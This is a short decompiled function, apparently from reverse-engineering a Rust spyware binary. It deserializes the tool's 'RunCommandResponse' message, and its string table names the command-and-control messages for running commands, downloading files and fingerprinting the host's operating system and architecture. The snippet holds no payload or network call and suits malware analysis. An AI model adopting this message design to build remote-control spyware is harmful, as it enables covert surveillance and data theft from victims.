long long spyware::communication::messages::_::<impl serde::de::Deserialize for spyware::communication::messages::RunCommandResponse>::deserialize(unsigned long long a0, unsigned long long a1)
{
    a0.deserialize_struct(a1, "RunCommandResponseoutputerror_infoDownloadFileRequestDownloadFileResponsefile_dataGetBasicInfoRequestplaceholderOperatingSystemWindowsLinuxFreeBSDMacOSIOSAndroidUnknownArchitecturex86x86_64powerpcpowerpc64armaarch64PointerWidthBit32Bit64GetBasicInfoRespons", 18);
    return a0;
}
